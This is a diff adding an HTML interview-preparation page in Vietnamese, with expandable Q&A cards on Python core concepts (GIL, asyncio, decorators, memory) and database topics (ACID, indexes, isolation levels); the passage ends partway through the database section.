@@ -1,0 +1,2800 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Interview Q&A — Tyme Prep</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<style>
+  :root {
+    --bg: #0f1117;
+    --bg2: #1a1d27;
+    --bg3: #22263a;
+    --border: #2e3250;
+    --text: #e2e4f0;
+    --text-dim: #8890b0;
+    --accent-py: #3b82f6;
+    --accent-db: #10b981;
+    --accent-api: #f59e0b;
+    --accent-sec: #ef4444;
+    --accent-algo: #a855f7;
+    --accent-proj: #06b6d4;
+    --tag-bg-py: rgba(59,130,246,0.15);
+    --tag-bg-db: rgba(16,185,129,0.15);
+    --radius: 10px;
+    --sidebar-w: 260px;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    line-height: 1.7;
+    display: flex;
+    min-height: 100vh;
+  }
+
+  /* ── SIDEBAR ── */
+  .sidebar {
+    width: var(--sidebar-w);
+    background: var(--bg2);
+    border-right: 1px solid var(--border);
+    padding: 24px 16px;
+    position: fixed;
+    top: 0; left: 0; bottom: 0;
+    overflow-y: auto;
+    z-index: 100;
+  }
+
+  .sidebar h1 {
+    font-size: 14px;
+    text-transform: uppercase;
+    letter-spacing: .1em;
+    color: var(--text-dim);
+    margin-bottom: 20px;
+    padding-bottom: 12px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .topic-btn {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    width: 100%;
+    padding: 10px 14px;
+    border: none;
+    background: transparent;
+    color: var(--text-dim);
+    border-radius: 8px;
+    cursor: pointer;
+    font-size: 14px;
+    text-align: left;
+    transition: all .2s;
+    margin-bottom: 4px;
+  }
+
+  .topic-btn:hover { background: var(--bg3); color: var(--text); }
+  .topic-btn.active { color: var(--text); background: var(--bg3); }
+
+  .topic-dot {
+    width: 8px; height: 8px;
+    border-radius: 50%;
+    flex-shrink: 0;
+  }
+
+  .badge {
+    margin-left: auto;
+    font-size: 11px;
+    padding: 2px 7px;
+    border-radius: 10px;
+    background: var(--bg3);
+    color: var(--text-dim);
+  }
+
+  .badge.done { background: rgba(16,185,129,.2); color: #10b981; }
+
+  .sidebar-footer {
+    position: absolute;
+    bottom: 16px; left: 16px; right: 16px;
+    font-size: 12px;
+    color: var(--text-dim);
+    text-align: center;
+  }
+
+  /* ── MAIN ── */
+  .main {
+    margin-left: var(--sidebar-w);
+    flex: 1;
+    padding: 40px 48px;
+    max-width: 900px;
+  }
+
+  .section { display: none; }
+  .section.active { display: block; }
+
+  .section-header {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    margin-bottom: 32px;
+    padding-bottom: 20px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .section-icon {
+    width: 44px; height: 44px;
+    border-radius: 12px;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 20px;
+    flex-shrink: 0;
+  }
+
+  .section-header h2 {
+    font-size: 24px;
+    font-weight: 700;
+  }
+
+  .section-header p {
+    font-size: 14px;
+    color: var(--text-dim);
+    margin-top: 2px;
+  }
+
+  /* ── Q&A CARD ── */
+  .qa-card {
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    margin-bottom: 12px;
+    overflow: hidden;
+    transition: border-color .2s;
+  }
+
+  .qa-card:hover { border-color: #3e4470; }
+  .qa-card.open { border-color: #4a5080; }
+
+  .qa-question {
+    display: flex;
+    align-items: flex-start;
+    gap: 14px;
+    padding: 16px 20px;
+    cursor: pointer;
+    user-select: none;
+    background: var(--bg2);
+    transition: background .15s;
+  }
+
+  .qa-question:hover { background: var(--bg3); }
+  .qa-card.open .qa-question { background: var(--bg3); }
+
+  .q-num {
+    font-size: 12px;
+    font-weight: 700;
+    color: var(--text-dim);
+    padding: 2px 8px;
+    border-radius: 6px;
+    background: var(--bg3);
+    flex-shrink: 0;
+    margin-top: 2px;
+    min-width: 36px;
+    text-align: center;
+  }
+
+  .q-text {
+    font-size: 15px;
+    font-weight: 600;
+    flex: 1;
+    color: var(--text);
+  }
+
+  .qa-chevron {
+    color: var(--text-dim);
+    font-size: 12px;
+    transition: transform .25s;
+    flex-shrink: 0;
+    margin-top: 4px;
+  }
+
+  .qa-card.open .qa-chevron { transform: rotate(180deg); }
+
+  .qa-answer {
+    display: none;
+    padding: 20px 20px 20px 74px;
+    background: var(--bg);
+    border-top: 1px solid var(--border);
+    font-size: 14.5px;
+    line-height: 1.75;
+  }
+
+  .qa-card.open .qa-answer { display: block; }
+
+  .qa-answer p { margin-bottom: 10px; }
+  .qa-answer p:last-child { margin-bottom: 0; }
+
+  .qa-answer ul, .qa-answer ol {
+    margin: 8px 0 8px 20px;
+  }
+
+  .qa-answer li { margin-bottom: 5px; }
+
+  .qa-answer strong { color: #c9d1ff; }
+
+  .qa-answer em { color: #94a3b8; font-style: normal; }
+
+  /* Table */
+  .qa-answer table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 12px 0;
+    font-size: 13.5px;
+  }
+
+  .qa-answer th {
+    background: var(--bg3);
+    padding: 8px 12px;
+    text-align: left;
+    font-weight: 600;
+    color: var(--text-dim);
+    border: 1px solid var(--border);
+  }
+
+  .qa-answer td {
+    padding: 8px 12px;
+    border: 1px solid var(--border);
+    vertical-align: top;
+  }
+
+  .qa-answer tr:nth-child(even) td { background: rgba(255,255,255,.02); }
+
+  /* Code */
+  .qa-answer pre {
+    margin: 14px 0;
+    border-radius: 8px;
+    overflow-x: auto;
+    border: 1px solid #2a2f50;
+  }
+
+  .qa-answer pre code {
+    font-size: 13px;
+    line-height: 1.6;
+    font-family: "JetBrains Mono", "Fira Code", monospace;
+  }
+
+  .qa-answer code:not(pre code) {
+    background: var(--bg3);
+    color: #93c5fd;
+    padding: 1px 6px;
+    border-radius: 4px;
+    font-size: 13px;
+    font-family: "JetBrains Mono", monospace;
+  }
+
+  /* Progress bar */
+  .progress-bar {
+    height: 3px;
+    border-radius: 2px;
+    margin-bottom: 28px;
+    overflow: hidden;
+    background: var(--bg3);
+  }
+
+  .progress-fill {
+    height: 100%;
+    border-radius: 2px;
+    transition: width .3s;
+  }
+
+  /* Topic colors */
+  .py  .topic-dot, .py  .progress-fill, .py  .section-icon { background: var(--accent-py); }
+  .db  .topic-dot, .db  .progress-fill, .db  .section-icon { background: var(--accent-db); }
+  .api .topic-dot, .api .progress-fill, .api .section-icon { background: var(--accent-api); }
+  .sec .topic-dot, .sec .progress-fill, .sec .section-icon { background: var(--accent-sec); }
+  .algo .topic-dot,.algo .progress-fill,.algo .section-icon { background: var(--accent-algo); }
+  .proj .topic-dot,.proj .progress-fill,.proj .section-icon { background: var(--accent-proj); }
+
+  .py .q-num   { color: var(--accent-py);  background: rgba(59,130,246,.15); }
+  .db .q-num   { color: var(--accent-db);  background: rgba(16,185,129,.15); }
+  .api .q-num  { color: var(--accent-api); background: rgba(245,158,11,.15); }
+  .sec .q-num  { color: var(--accent-sec); background: rgba(239,68,68,.15); }
+  .algo .q-num { color: var(--accent-algo);background: rgba(168,85,247,.15); }
+  .proj .q-num { color: var(--accent-proj);background: rgba(6,182,212,.15); }
+
+  /* Expand all */
+  .controls {
+    display: flex;
+    gap: 10px;
+    margin-bottom: 20px;
+    align-items: center;
+  }
+
+  .ctrl-btn {
+    padding: 6px 14px;
+    border-radius: 6px;
+    border: 1px solid var(--border);
+    background: var(--bg2);
+    color: var(--text-dim);
+    cursor: pointer;
+    font-size: 13px;
+    transition: all .15s;
+  }
+
+  .ctrl-btn:hover { background: var(--bg3); color: var(--text); }
+
+  .count-label {
+    margin-left: auto;
+    font-size: 13px;
+    color: var(--text-dim);
+  }
+
+  /* Coming soon */
+  .coming-soon {
+    text-align: center;
+    padding: 80px 40px;
+    color: var(--text-dim);
+  }
+
+  .coming-soon .icon { font-size: 48px; margin-bottom: 16px; }
+  .coming-soon h3 { font-size: 18px; color: var(--text); margin-bottom: 8px; }
+
+  @media (max-width: 768px) {
+    .sidebar { width: 200px; }
+    .main { margin-left: 200px; padding: 24px 20px; }
+    .qa-answer { padding-left: 20px; }
+  }
+</style>
+</head>
+<body>
+
+<!-- SIDEBAR -->
+<nav class="sidebar">
+  <h1>Study Prep</h1>
+
+  <button class="topic-btn py active" onclick="showTopic('py')">
+    <span class="topic-dot"></span> Python Core
+    <span class="badge done">20 ✓</span>
+  </button>
+  <button class="topic-btn api" onclick="showTopic('api')">
+    <span class="topic-dot"></span> FastAPI
+    <span class="badge done">20 ✓</span>
+  </button>
+  <button class="topic-btn db" onclick="showTopic('db')">
+    <span class="topic-dot"></span> Database
+    <span class="badge done">20 ✓</span>
+  </button>
+  <button class="topic-btn sec" onclick="showTopic('sec')">
+    <span class="topic-dot"></span> Security
+    <span class="badge done">20 ✓</span>
+  </button>
+  <button class="topic-btn algo" onclick="showTopic('algo')">
+    <span class="topic-dot"></span> Algorithms
+    <span class="badge done">20 ✓</span>
+  </button>
+  <button class="topic-btn proj" onclick="showTopic('proj')">
+    <span class="topic-dot"></span> Project / Design
+    <span class="badge done">20 ✓</span>
+  </button>
+
+  <div class="sidebar-footer">Tyme Interview Prep · 2026</div>
+</nav>
+
+<!-- MAIN -->
+<main class="main">
+
+  <!-- ══════════════════════════════════════════
+       PYTHON CORE
+  ══════════════════════════════════════════ -->
+  <section id="sec-py" class="section py active">
+    <div class="section-header">
+      <div class="section-icon">🐍</div>
+      <div>
+        <h2>Python Core</h2>
+        <p>GIL · Async · Memory · OOP · Pydantic · Exception handling</p>
+      </div>
+    </div>
+
+    <div class="progress-bar py"><div class="progress-fill" style="width:100%"></div></div>
+
+    <div class="controls">
+      <button class="ctrl-btn" onclick="expandAll('sec-py')">Mở tất cả</button>
+      <button class="ctrl-btn" onclick="collapseAll('sec-py')">Đóng tất cả</button>
+      <span class="count-label">20 câu hỏi</span>
+    </div>
+
+    <div class="qa-list">
+
+      <div class="qa-card py">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q1</span>
+          <span class="q-text">GIL là gì và tại sao nó tồn tại?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p><strong>GIL (Global Interpreter Lock)</strong> là mutex trong CPython ngăn nhiều thread chạy Python bytecode cùng lúc, dù có nhiều CPU core.</p>
+          <p>Tồn tại vì CPython dùng <strong>reference counting</strong> để quản lý memory — GIL bảo vệ counter đó khỏi race condition mà không cần lock từng object riêng lẻ.</p>
+        </div>
+      </div>
+
+      <div class="qa-card py">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q2</span>
+          <span class="q-text">GIL ảnh hưởng thế nào đến multithreading?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <ul>
+            <li><strong>I/O-bound</strong> (HTTP call, DB query, file read): thread release GIL khi chờ I/O → multithreading <strong>vẫn hiệu quả</strong>.</li>
+            <li><strong>CPU-bound</strong> (tính toán nặng): các thread tranh GIL nhau → <strong>không tận dụng được multi-core</strong>.</li>
+          </ul>
+          <p>Giải pháp cho CPU-bound: dùng <code>multiprocessing</code> — mỗi process có GIL riêng.</p>
+        </div>
+      </div>
+
+      <div class="qa-card py">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q3</span>
+          <span class="q-text">Phân biệt multiprocessing vs multithreading vs asyncio.</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <table>
+            <tr><th></th><th>Threading</th><th>Multiprocessing</th><th>AsyncIO</th></tr>
+            <tr><td>Dùng cho</td><td>I/O-bound</td><td>CPU-bound</td><td>I/O-bound nhiều kết nối</td></tr>
+            <tr><td>Parallelism thật</td><td>Không (GIL)</td><td>Có</td><td>Không (single thread)</td></tr>
+            <tr><td>Overhead</td><td>Thấp</td><td>Cao</td><td>Rất thấp</td></tr>
+          </table>
+        </div>
+      </div>
+
+      <div class="qa-card py">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q4</span>
+          <span class="q-text">async/await hoạt động như thế nào?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p><code>async def</code> tạo <strong>coroutine</strong> — hàm có thể tạm dừng tại <code>await</code> để nhường control cho event loop, rồi tiếp tục khi I/O xong.</p>
+          <p><strong>Event loop</strong> là vòng lặp duy nhất lên lịch và chạy các coroutine, không spawn thread mới. Tổng concurrency cao mà chỉ dùng một thread.</p>
+<pre><code class="language-python">import asyncio
+
+async def step(name, delay):
+    print(f"{name}: start")
+    await asyncio.sleep(delay)   # nhường control, không block
+    print(f"{name}: done")
+
+async def main():
+    await asyncio.gather(step("A", 2), step("B", 1))
+    # Output: A start → B start → B done → A done  (~2s, không phải 3s)
+
+asyncio.run(main())</code></pre>
+        </div>
+      </div>
+
+      <div class="qa-card py">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q5</span>
+          <span class="q-text">Sự khác biệt giữa asyncio.gather và asyncio.wait?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <ul>
+            <li><code>gather(*coros)</code>: chạy song song, trả về list kết quả <strong>theo thứ tự</strong>, nếu một cái raise exception thì toàn bộ fail (mặc định).</li>
+            <li><code>wait(tasks)</code>: linh hoạt hơn — có thể lấy <code>FIRST_COMPLETED</code>, <code>FIRST_EXCEPTION</code>, kiểm tra từng task riêng. Phù hợp khi cần control từng task độc lập.</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="qa-card py">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q6</span>
+          <span class="q-text">Generator là gì? Khi nào dùng?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>Generator là hàm dùng <code>yield</code> — tạo ra iterator <strong>lazy</strong>, không load toàn bộ data vào memory.</p>
+          <p>Dùng khi: xử lý file/dataset lớn, pipeline xử lý tuần tự, cần tiết kiệm memory.</p>
+<pre><code class="language-python">def read_chunks(file_path, size=1024):
+    with open(file_path) as f:
+        while chunk := f.read(size):
+            yield chunk   # Không load toàn bộ file vào RAM</code></pre>
+        </div>
+      </div>
+
+      <div class="qa-card py">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q7</span>
+          <span class="q-text">__slots__ dùng để làm gì?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>Mặc định mỗi instance Python có <code>__dict__</code> (tốn ~200-400 bytes). <code>__slots__</code> khai báo cố định các attribute → loại bỏ <code>__dict__</code>, <strong>tiết kiệm 40-60% memory</strong>.</p>
+          <p>Dùng khi tạo hàng triệu object cùng loại (tick data, transaction record).</p>
+<pre><code class="language-python">class Transaction:
+    __slots__ = ("id", "amount", "status")</code></pre>
+        </div>
+      </div>
+
+      <div class="qa-card py">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q8</span>
+          <span class="q-text">Decorator là gì? Viết một decorator đơn giản.</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>Decorator là hàm nhận hàm khác làm input, bọc thêm logic, trả về hàm mới. Dùng cho: logging, timing, retry, auth check, caching.</p>
+<pre><code class="language-python">import functools
+
+def log_call(func):
+    @functools.wraps(func)
+    def wrapper(*args, **kwargs):
+        print(f"Calling {func.__name__}")
+        return func(*args, **kwargs)
+    return wrapper
+
+@log_call
+def process_payment(amount): ...</code></pre>
+        </div>
+      </div>
+
+      <div class="qa-card py">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q9</span>
+          <span class="q-text">@functools.wraps dùng để làm gì?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>Giữ nguyên metadata của hàm gốc (<code>__name__</code>, <code>__doc__</code>, <code>__module__</code>) sau khi bọc decorator. Không có nó, <code>func.__name__</code> trả về <code>"wrapper"</code> thay vì tên hàm thật — gây khó debug và docs sai.</p>
+        </div>
+      </div>
+
+      <div class="qa-card py">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q10</span>
+          <span class="q-text">Context manager là gì? Cách implement?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>Object đảm bảo resource được khởi tạo và <strong>giải phóng đúng cách dù có exception</strong>. Implement bằng <code>__enter__</code>/<code>__exit__</code> hoặc <code>@contextmanager</code>.</p>
+<pre><code class="language-python">from contextlib import contextmanager
+
+@contextmanager
+def transaction(conn):
+    try:
+        yield conn
+        conn.commit()
+    except:
+        conn.rollback()
+        raise</code></pre>
+        </div>
+      </div>
+
+      <div class="qa-card py">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q11</span>
+          <span class="q-text">Phân biệt deepcopy vs shallow copy.</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <ul>
+            <li><strong>Shallow copy</strong> (<code>copy.copy</code>): tạo object mới nhưng nested object bên trong vẫn là reference đến object cũ.</li>
+            <li><strong>Deep copy</strong> (<code>copy.deepcopy</code>): tạo hoàn toàn độc lập, copy đệ quy tất cả nested object.</li>
+          </ul>
+          <p>Dùng deepcopy khi cần thay đổi nested data mà không ảnh hưởng bản gốc.</p>
+        </div>
+      </div>
+
+      <div class="qa-card py">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q12</span>
+          <span class="q-text">List comprehension vs map() — khi nào dùng cái nào?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <ul>
+            <li><strong>List comprehension</strong>: dễ đọc hơn, Pythonic, phù hợp phần lớn trường hợp.</li>
+            <li><strong><code>map()</code></strong>: trả về iterator (lazy) — tốt hơn khi không cần list đầy đủ ngay, hoặc khi truyền vào hàm có sẵn.</li>
+          </ul>
+<pre><code class="language-python">squares = [x**2 for x in range(100)]      # list comprehension — rõ ràng
+result  = map(str, filter(lambda x: x > 0, data))  # lazy, tiết kiệm memory</code></pre>
+        </div>
+      </div>
+
+      <div class="qa-card py">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q13</span>
+          <span class="q-text">*args và **kwargs là gì?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <ul>
+            <li><code>*args</code>: nhận số lượng positional argument tùy ý, đóng gói thành <strong>tuple</strong>.</li>
+            <li><code>**kwargs</code>: nhận số lượng keyword argument tùy ý, đóng gói thành <strong>dict</strong>.</li>
+          </ul>
+          <p>Dùng để viết hàm linh hoạt, wrapper function, decorator truyền argument xuống hàm gốc.</p>
+        </div>
+      </div>
+
+      <div class="qa-card py">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q14</span>
+          <span class="q-text">Python quản lý memory như thế nào?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>CPython dùng <strong>reference counting</strong> — mỗi object có counter, khi counter về 0 thì giải phóng ngay.</p>
+          <p>Ngoài ra có <strong>cyclic garbage collector</strong> để phát hiện và thu hồi reference cycle (A → B → A).</p>
+          <p><strong>Memory pool (pymalloc)</strong> tái dùng block nhỏ để giảm overhead gọi <code>malloc</code>.</p>
+        </div>
+      </div>
+
+      <div class="qa-card py">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q15</span>
+          <span class="q-text">is vs == khác nhau thế nào?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <ul>
+            <li><code>==</code>: so sánh <strong>giá trị</strong> (gọi <code>__eq__</code>).</li>
+            <li><code>is</code>: so sánh <strong>identity</strong> — cùng object trong memory hay không (cùng <code>id()</code>).</li>
+          </ul>
+<pre><code class="language-python">a = [1, 2, 3]; b = [1, 2, 3]
+a == b   # True  (giá trị bằng)
+a is b   # False (object khác nhau)
+
+if value is None: ...   # đúng cách</code></pre>
+        </div>
+      </div>
+
+      <div class="qa-card py">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q16</span>
+          <span class="q-text">Exception chaining (raise ... from ...) là gì?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>Khi bắt exception và raise exception mới, dùng <code>from</code> để giữ nguyên original traceback. Giúp debug biết được root cause thật sự.</p>
+<pre><code class="language-python">try:
+    result = db.query(sql)
+except psycopg2.Error as e:
+    raise RuntimeError("DB query failed") from e
+# Traceback hiển thị cả psycopg2.Error lẫn RuntimeError</code></pre>
+        </div>
+      </div>
+
+      <div class="qa-card py">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q17</span>
+          <span class="q-text">Phân biệt classmethod vs staticmethod vs instance method.</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <ul>
+            <li><strong>Instance method</strong>: nhận <code>self</code> → truy cập instance và class.</li>
+            <li><strong><code>@classmethod</code></strong>: nhận <code>cls</code> → truy cập class, không cần instance. Dùng cho factory method.</li>
+            <li><strong><code>@staticmethod</code></strong>: không nhận <code>self</code> hay <code>cls</code> → hàm thuần túy đặt trong class cho gọn.</li>
+          </ul>
+<pre><code class="language-python">class Payment:
+    @classmethod
+    def from_dict(cls, data):         # Factory
+        return cls(data["amount"])
+
+    @staticmethod
+    def validate(amount) -> bool:     # Utility
+        return amount > 0</code></pre>
+        </div>
+      </div>
+
+      <div class="qa-card py">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q18</span>
+          <span class="q-text">__init__ vs __new__ khác nhau thế nào?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <ul>
+            <li><code>__new__</code>: <strong>tạo ra instance mới</strong> (allocate memory), gọi trước <code>__init__</code>. Ít khi override trừ Singleton hoặc metaclass.</li>
+            <li><code>__init__</code>: <strong>khởi tạo instance đã tồn tại</strong> (set attribute).</li>
+          </ul>
+<pre><code class="language-python">class Singleton:
+    _instance = None
+    def __new__(cls):
+        if cls._instance is None:
+            cls._instance = super().__new__(cls)
+        return cls._instance</code></pre>
+        </div>
+      </div>
+
+      <div class="qa-card py">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q19</span>
+          <span class="q-text">Pydantic dùng để làm gì? Tại sao quan trọng trong API?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>Pydantic là thư viện validation và serialization dùng type hints. Tự động parse, validate và convert data khi nhận từ request.</p>
+          <p>Trong fintech quan trọng vì: phát hiện malformed input sớm, đảm bảo type safety (tránh string thay vì số tiền), tự sinh JSON schema cho API docs.</p>
+<pre><code class="language-python">class TransferRequest(BaseModel):
+    amount: Decimal = Field(gt=0)
+    currency: str   = Field(min_length=3, max_length=3)</code></pre>
+        </div>
+      </div>
+
+      <div class="qa-card py">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q20</span>
+          <span class="q-text">Làm sao tối ưu performance Python service xử lý nhiều request?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <ol>
+            <li><strong>AsyncIO + async framework</strong> (FastAPI) — tránh blocking I/O.</li>
+            <li><strong>Connection pooling</strong> cho DB và Redis — không tạo connection mới mỗi request.</li>
+            <li><strong>Cache</strong> kết quả tốn kém (tỷ giá, config) vào Redis với TTL.</li>
+            <li><strong>Generator</strong> cho streaming data lớn — tránh load toàn bộ vào memory.</li>
+            <li><strong>Profile trước khi optimize</strong> — dùng <code>cProfile</code> hoặc <code>py-spy</code>.</li>
+            <li><strong>CPU-bound task</strong> → offload sang Celery worker hoặc multiprocessing.</li>
+          </ol>
+        </div>
+      </div>
+
+    </div><!-- end .qa-list -->
+  </section>
+
+  <!-- ══════════════════════════════════════════
+       DATABASE
+  ══════════════════════════════════════════ -->
+  <section id="sec-db" class="section db">
+    <div class="section-header">
+      <div class="section-icon">🗄️</div>
+      <div>
+        <h2>Database</h2>
+        <p>ACID · Index · Isolation · Lock · Redis · Schema Design · CAP</p>
+      </div>
+    </div>
+
+    <div class="progress-bar db"><div class="progress-fill" style="width:100%"></div></div>
+
+    <div class="controls">
+      <button class="ctrl-btn" onclick="expandAll('sec-db')">Mở tất cả</button>
+      <button class="ctrl-btn" onclick="collapseAll('sec-db')">Đóng tất cả</button>
+      <span class="count-label">20 câu hỏi</span>
+    </div>
+
+    <div class="qa-list">
+
+      <div class="qa-card db">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q1</span>
+          <span class="q-text">ACID là gì? Giải thích từng tính chất.</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <ul>
+            <li><strong>Atomicity</strong>: Transaction hoặc thành công toàn bộ, hoặc rollback toàn bộ — không có trạng thái nửa vời.</li>
+            <li><strong>Consistency</strong>: Dữ liệu luôn chuyển từ trạng thái hợp lệ này sang trạng thái hợp lệ khác (constraints, triggers không vi phạm).</li>
+            <li><strong>Isolation</strong>: Các transaction đồng thời không thấy kết quả trung gian của nhau.</li>
+            <li><strong>Durability</strong>: Sau khi commit, dữ liệu ghi vĩnh viễn dù hệ thống crash (WAL log).</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="qa-card db">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q2</span>
+          <span class="q-text">Clustered Index vs Non-Clustered Index khác nhau thế nào?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <ul>
+            <li><strong>Clustered</strong>: Dữ liệu vật lý sắp xếp theo index. Mỗi bảng chỉ có <strong>một</strong> (thường là Primary Key). Lookup rất nhanh vì data nằm ngay trong leaf node.</li>
+            <li><strong>Non-Clustered</strong>: Index riêng biệt, leaf node chứa <strong>pointer</strong> đến row thật. Lookup cần 2 bước: tìm index → follow pointer. Một bảng có nhiều non-clustered index.</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="qa-card db">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q3</span>
+          <span class="q-text">Khi nào nên tạo index? Khi nào không nên?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p><strong>Nên tạo:</strong> Column thường xuất hiện trong <code>WHERE</code>, <code>JOIN</code>, <code>ORDER BY</code>; column có cardinality cao (nhiều giá trị distinct).</p>
+          <p><strong>Không nên:</strong> Bảng nhỏ (&lt;1000 rows) — full scan nhanh hơn; column ít distinct value (status chỉ 2-3 giá trị); bảng write-heavy — mỗi INSERT/UPDATE/DELETE phải cập nhật tất cả index.</p>
+        </div>
+      </div>
+
+      <div class="qa-card db">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q4</span>
+          <span class="q-text">Composite Index là gì? Rule nào khi thiết kế?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>Index trên nhiều column. Rule quan trọng: <strong>đặt column equality trước, range sau</strong>; column có selectivity cao lên trước.</p>
+<pre><code class="language-sql">-- Phục vụ: WHERE user_id = 1 AND created_at > '2026-01-01'
+-- Phục vụ: WHERE user_id = 1
+-- KHÔNG phục vụ: WHERE created_at > '2026-01-01' (bỏ qua leading column)
+CREATE INDEX idx ON orders(user_id, created_at DESC);</code></pre>
+        </div>
+      </div>
+
+      <div class="qa-card db">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q5</span>
+          <span class="q-text">Có những Transaction Isolation Level nào?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <table>
+            <tr><th>Level</th><th>Dirty Read</th><th>Non-repeatable</th><th>Phantom</th></tr>
+            <tr><td>Read Uncommitted</td><td>Có</td><td>Có</td><td>Có</td></tr>
+            <tr><td>Read Committed</td><td>Không</td><td>Có</td><td>Có</td></tr>
+            <tr><td>Repeatable Read</td><td>Không</td><td>Không</td><td>Có</td></tr>
+            <tr><td>Serializable</td><td>Không</td><td>Không</td><td>Không</td></tr>
+          </table>
+          <p>PostgreSQL mặc định <strong>Read Committed</strong>. Banking nên dùng <strong>Repeatable Read</strong> hoặc <strong>Serializable</strong>.</p>
+        </div>
+      </div>
+
+      <div class="qa-card db">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q6</span>
+          <span class="q-text">Dirty Read, Non-repeatable Read, Phantom Read là gì?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <ul>
+            <li><strong>Dirty Read</strong>: Đọc data chưa commit của T1. T1 rollback → T2 đọc sai.</li>
+            <li><strong>Non-repeatable Read</strong>: Đọc lại cùng row trong transaction thấy kết quả khác (T2 đã UPDATE và commit ở giữa).</li>
+            <li><strong>Phantom Read</strong>: Đọc lại cùng query thấy số row khác (T2 đã INSERT thêm row mới thoả điều kiện WHERE).</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="qa-card db">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q7</span>
+          <span class="q-text">Optimistic Lock vs Pessimistic Lock — khi nào dùng cái nào?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <ul>
+            <li><strong>Pessimistic</strong> (<code>SELECT FOR UPDATE</code>): Lock ngay khi đọc. Dùng khi conflict rate cao. Đơn giản nhưng giảm throughput, dễ deadlock.</li>
